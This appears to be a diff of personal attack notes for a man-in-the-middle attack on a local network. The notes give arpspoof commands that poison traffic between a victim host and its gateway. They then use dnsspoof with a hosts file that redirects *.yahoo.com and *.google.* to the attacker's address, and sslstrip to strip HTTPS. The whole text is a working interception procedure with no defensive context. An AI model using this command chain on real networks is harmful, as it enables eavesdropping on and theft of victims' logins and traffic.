@@ -15,9 +15,9 @@ arpspoof -i eth0 -t 10.20.20.132 10.20.20.2
 
 arpspoof -i eth0 -t 10.20.20.2 10.20.20.132
 
-python dns2proxy.py  ( dnschef -h ) fake dns
+python dns2proxy.py  ( dnschef -h ) like -> dnsspoof -i eth0 -f /root/Desktop/hosts.txt ( host file listfake dns record below)
 
-Listen resolve DNS victim -> dnsspoof -i eth0 -f /root/Desktop/hosts.txt
-
+                                                                                            10.20.20.130   *.yahoo.com
+                                                                                            10.20.20.130   *.google.*
 sslstrip -l 9000 -a
 
